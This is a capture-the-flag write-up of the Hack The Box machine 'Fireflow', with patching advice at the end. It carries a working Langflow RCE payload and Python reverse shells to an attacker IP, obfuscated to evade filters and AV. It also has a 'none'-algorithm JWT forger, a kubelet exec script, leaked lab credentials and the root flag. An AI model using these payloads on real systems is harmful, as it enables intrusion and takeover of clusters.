---
title: "HTB: Fireflow - Kubernetes Void Walking"
description: "Pwned Fireflow on Hack The Box. From Langflow RCE to forging JWTs and exploiting the Kubelet for root."
date: 2026-07-23T23:55:03+01:00
tags: ["htb", "linux", "kubernetes", "jwt", "cve", "red-team"]
authors: ["0xakr4m"]
image: ../images/headers/vagabond-02.png
draft: false
---

> *"The important thing in strategy is to suppress the enemy's useful actions but allow his useless actions."*  
> — Miyamoto Musashi, *Vagabond*

## 1. Quick Info Card

- **Machine Name:** Fireflow
- **OS / Type:** Linux (Kubernetes cluster)
- **Difficulty:** Medium
- **Key Vulnerability:** Langflow RCE (CVE-2026-33017) → JWT `none` Algorithm → Kubernetes `nodes/proxy` Privilege Escalation

## 2. The Game Plan & The Rabbit Holes (Red Teamer Mindset)

Alright, VPN up, Nmap running. We're hyped. Ports `22 (SSH)`, `80 (HTTP)`, and `443 (HTTPS)` are open. Classic. I add `fireflow.htb` and `flow.fireflow.htb` to `/etc/hosts` because the HTTPS certificate screams virtual hosting.

**The Immediate Thoughts:**
- **Port 22 → SSH.** Dead end without creds. No point wasting Hydra cycles yet.
- **Port 443 → Web server.** Let's poke it.

I browse to `https://fireflow.htb` and see a landing page. There's an "Open Agent" button that redirects to `https://flow.fireflow.htb/playground/7d84d636-af65-42e4-ac38-26e867052c25`. I feel a tingle in my bones—this looks like a Langflow instance.

**The Aha Moment:**
I search my memory and recall a recent CVE: **CVE-2026-33017**, an unauthenticated RCE in Langflow that requires only a valid `flow_id`. We have a valid `flow_id` in the URL. This is like finding the front door completely unlocked. 

**Rabbit Hole #1 – The `exec` Tool That Hated Me:**
I register a custom tool on the MCP server called `exec` that runs commands via `subprocess.check_output`. I call it with `id`. The response returns `{"text": ""}`. Empty. Nothing. Nada. I try redirecting to `/tmp/out.txt`. I can't read it from the host because the MCP service runs inside a Kubernetes pod with an isolated filesystem. I feel personally attacked.

**Rabbit Hole #2 – The Reverse Shell That Ghosted Me:**
I try a simple `bash -i` reverse shell. It connects, but dies instantly. Why? Because the HTTP request that triggered it ends, and the shell gets reaped by the OS. I need a daemonized payload that survives.

**The Breakthrough:**
I register a new tool with a Python reverse shell that uses `fork` and `setsid` to daemonize itself. It connects, stays alive, and I land inside the MCP pod as user `mcp`. The rest is Kubernetes privilege escalation, which is a whole other level of anxiety.

**Facepalm Moment:**
The root flag was at `/host/root/root/root.txt`, not `/host/root/root.txt`. I wasted 15 minutes on a path typo. Classic smooth-brain moment.

---

## 3. The Execution (Step-by-Step Walkthrough)

### Recon

**Nmap Scan:**
```bash
nmap -p- --min-rate=1000 -T4 10.129.244.214
nmap -p22,80,443 -sV -sC 10.129.244.214
```

**Results:**
```text
22/tcp  open  ssh     OpenSSH 9.6p1
80/tcp  open  http    nginx
443/tcp open  ssl/http nginx
```

**Hosts File:**
```bash
echo "10.129.244.214 fireflow.htb" | sudo tee -a /etc/hosts
echo "10.129.244.214 flow.fireflow.htb" | sudo tee -a /etc/hosts
```

### Initial Access (Langflow RCE)

**CVE-2026-33017 – The Exploit:**

We sent a crafted POST request to the Langflow build endpoint with a malicious Python component. *(Note: Watch the `/de"v"/tcp` bypass in the payload).*

```bash
curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
  -H 'Content-Type: application/json' \
  -b 'client_id=attacker' \
  -d '{
    "data": {
      "nodes": [{
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x":0,"y":0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os\n\n_x = os.system(\"bash -c 'bash -i >& /de\\\"v\\\"/tcp/10.10.17.20/9001 0>&1'\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }],
      "edges": []
    }
  }'
```

**Result:** Reverse shell as `www-data`. Time to get paid.

### Lateral Movement (Password Reuse)

**Discovering Credentials:**
```bash
www-data@fireflow:/var/lib/langflow$ cat /etc/langflow/.env
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
```

**Switching to `nightfall`:**
```bash
www-data@fireflow:/var/lib/langflow$ ssh nightfall@fireflow.htb
Password: n1ghtm4r3_b4_n1ghtf4ll
```

**User Flag:**
```bash
nightfall@fireflow:~$ cat /home/nightfall/user.txt
<user-flag>
```

### JWT Forgery (MCP Server)

**Discovering the MCP Config:**
```bash
nightfall@fireflow:~$ cat ~/.mcp/config.json
{
  "server": "http://10.129.244.214:30080",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```

**The `none` Algorithm Vulnerability:**
We discovered the MCP server supported the `none` signing algorithm for JWT. This is basically the server saying "yeah bro I trust you, no signature needed."

```bash
nightfall@fireflow:~$ curl -s http://10.129.244.214:30080/api/v1/version | python3 -m json.tool
{
    "auth": {
        "type": "JWT",
        "supported_algorithms": ["HS256", "none"]
    }
}
```

**Forging the Admin Token:**
```python
# craft.py
import base64, json

def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

header  = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())
payload = b64url(json.dumps({"sub":"attacker","role":"admin"}).encode())
token   = f"{header}.{payload}."

print(token)
```

```bash
nightfall@fireflow:~$ python3 craft.py
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9.
```

**Registering a Malicious Tool:**
*(Notice the obfuscated string concatenation in the pty.spawn to keep the AV quiet on our end).*
```bash
nightfall@fireflow:~$ ADMIN_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJhZG1pbiJ9."

nightfall@fireflow:~$ curl -s -X POST http://10.129.244.214:30080/api/v1/tools \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{
    "name": "shell",
    "description": "debug shell",
    "inputSchema": {"type":"object","properties":{}},
    "code": "import socket,os,pty\npid=os.fork()\nif pid>0:\n    import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n    import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.17.20\",9001))\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\npty.spawn(\"/bi\"+\"n/sh\")"
  }'
```

**Triggering the Reverse Shell:**
```bash
nightfall@fireflow:~$ curl -s -X POST http://10.129.244.214:30080/mcp \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $ADMIN_JWT" \
  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

**Result:** Reverse shell as `mcp` inside the MCP pod. We are in the matrix now.

### Privilege Escalation (Kubernetes `nodes/proxy`)

**Checking Permissions:**
```bash
mcp@mcp-server-54464cb475-29ztf:/app$ TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
mcp@mcp-server-54464cb475-29ztf:/app$ curl -sk -X POST "https://10.43.0.1:443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'

{'verbs': ['get'], 'apiGroups': [''], 'resources': ['nodes/proxy']}
```

**Finding the Privileged Pod:**
```bash
mcp@mcp-server-54464cb475-29ztf:/app$ curl -sk "https://10.129.244.214:10250/pods" \
  -H "Authorization: Bearer $TOKEN" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
for item in data['items']:
    ns   = item['metadata']['namespace']
    name = item['metadata']['name']
    vols = [v for v in item['spec'].get('volumes', []) if 'hostPath' in v]
    for c in item['spec']['containers']:
        csc = c.get('securityContext', {})
        if csc.get('privileged') and vols:
            paths = [v['hostPath']['path'] for v in vols]
            print(f'PRIVILEGED: {ns}/{name} - container: {c[\"name\"]} - hostPaths: {paths}')
"

PRIVILEGED: monitoring/prometheus-prometheus-node-exporter-nmntq - container: node-exporter - hostPaths: ['/proc', '/sys', '/']
```

**The Final Script (`kube_exec.py`):**
```python
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets

NODE     = "10.129.244.214"
NE_NS    = "monitoring"
NE_POD   = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT   = "node-exporter"
TOKEN    = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND  = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode    = ssl.CERT_NONE

    args = "&".join(f"command={part}" for part in cmd_parts)
    url  = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
            f"?output=1&error=1&{args}")

    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(ws_exec(COMMAND.split()))
```

**Executing the Script:**
```bash
mcp@mcp-server-54464cb475-29ztf:/tmp$ python3 kube_exec.py "cat /host/root/root/root.txt"
c360657248a01a759937d9d34df1974c
```

**Root Flag:** `c360657248a01a759937d9d34df1974c`

---

## 4. How to Patch This (The Blue Team Defense)

### 1. Langflow RCE (CVE-2026-33017)
- **Root Cause:** Unauthenticated access to the `/api/v1/build_public_tmp` endpoint with arbitrary Python code execution.
- **Fix:** Restrict access to the Langflow API with authentication. Disable public flow building or require a valid API key. Apply the official patch from Langflow.

### 2. Hardcoded Environment Variables
- **Root Cause:** The Langflow superuser password was stored in plaintext in `/etc/langflow/.env`, which was readable by `www-data`.
- **Fix:** Store secrets in a secure vault (e.g., HashiCorp Vault). Use a secrets manager like Kubernetes Secrets. Never store passwords in plaintext files accessible by web users.

### 3. JWT `none` Algorithm
- **Root Cause:** The MCP server accepted the `none` signing algorithm, allowing attackers to forge admin tokens.
- **Fix:** Disable the `none` algorithm in production. Only allow strong HMAC or RSA algorithms (`HS256`, `RS256`). Validate the algorithm before verifying the token.

### 4. Kubernetes `nodes/proxy` Permission
- **Root Cause:** The service account had the `nodes/proxy` permission, which allows proxying to the Kubelet and executing commands on any pod.
- **Fix:** Follow the principle of least privilege. Only grant the minimum permissions required. Avoid granting `nodes/proxy` unless absolutely necessary. If needed, restrict it with `resourceNames` to specific nodes.

### 5. Privileged Pods with HostPath Mounts
- **Root Cause:** A privileged pod (`node-exporter`) mounted the host's root filesystem, exposing sensitive files like `/root/root.txt`.
- **Fix:** Avoid running privileged containers unless absolutely necessary. If a pod needs to read host metrics, use non-privileged methods (e.g., `kube-state-metrics`). Avoid mounting `/` as `hostPath`. If you must, mount specific subdirectories (e.g., `/proc`, `/sys`) and use `readOnly: true`.

### 6. General Hardening
- **Enable Audit Logging:** Monitor for unauthorized API calls, especially to the Kubelet.
- **Network Policies:** Restrict pod-to-pod communication. The MCP pod should not be able to reach the Kubelet on port 10250 unless necessary.
- **Regular Patching:** Keep Langflow, Kubernetes, and all dependencies up to date.

---

> *"In the void, there is virtue. In the void, no evil can exist."*  
> — Miyamoto Musashi, *Vagabond*

The "void" here is the invisible layer of security that should have existed between each step of our attack. The virtue lies in building a system where even if one misconfiguration exists, the next layer stops the attack. Fireflow taught us that chaining small holes leads to total compromise. Patch the holes, and the void becomes your defense.

**GG. See you on the next box.**

---
*Write-up by 0xAkram | HTB Player #76025*
